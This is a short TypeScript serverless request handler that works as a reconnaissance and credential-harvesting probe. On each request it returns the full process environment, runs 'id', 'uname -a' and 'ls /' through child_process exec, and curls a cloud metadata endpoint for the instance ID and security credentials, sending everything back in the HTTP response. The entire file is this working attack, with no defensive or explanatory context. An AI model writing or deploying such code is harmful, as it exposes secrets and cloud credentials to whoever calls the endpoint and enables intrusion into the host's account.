import { exec } from "node:child_process"

export async function onRequest(context: any): Promise<Response> {
  const out: any = { env: process.env, pid: process.pid, cwd: process.cwd() }
  try {
    const r: any = await new Promise((res) => exec("id; uname -a; ls /; curl -s -m 3 http://169.254.0.23/latest/meta-data/instance-id; echo; curl -s -m 3 http://169.254.0.23/latest/meta-data/cam/security-credentials/", { timeout: 8000 }, (e, so, se) => res({ e: e ? String(e).slice(0,100) : null, so, se })))
    out.exec = r
  } catch (e) { out.execErr = String(e).slice(0, 200) }
  return new Response(JSON.stringify(out), { headers: { "Content-Type": "application/json" } })
}
